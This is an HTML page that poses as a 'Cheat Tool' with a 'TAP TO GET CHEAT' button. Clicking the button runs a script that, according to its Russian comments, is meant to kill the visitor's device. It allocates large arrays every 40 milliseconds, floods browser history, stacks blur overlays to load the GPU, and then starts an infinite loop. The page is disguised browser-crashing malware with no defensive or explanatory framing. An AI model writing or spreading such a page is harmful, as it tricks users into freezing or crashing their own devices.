<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cheat Tool</title>
    <style>
        body { background: #000; color: #f00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        button { padding: 30px; font-size: 20px; background: #222; color: #f00; border: 2px solid #f00; border-radius: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <button onclick="boom()">TAP TO GET CHEAT</button>
    <script>
        function boom() {
            // Звук (обязательно добавь sound.mp3 в гитхаб!)
            new Audio('sound.mp3').play().catch(() => {});
            
            document.body.innerHTML = '<h1>LOADING...</h1>';
            
            // Плавная, но смертельная нагрузка
            setInterval(() => {
                // Забиваем память (RAM)
                let leak = new Array(1000000).fill("⚠️");
                window.history.pushState({}, '', '#' + Math.random());
                
                // Забиваем графику (GPU)
                let d = document.createElement('div');
                d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(50px);opacity:0.1;';
                document.body.appendChild(d);
            }, 40);

            // Мертвый цикл через 1 секунду
            setTimeout(() => {
                while(true) { console.log(Math.random()); }
            }, 1000);
        }
    </script>
</body>
</html>
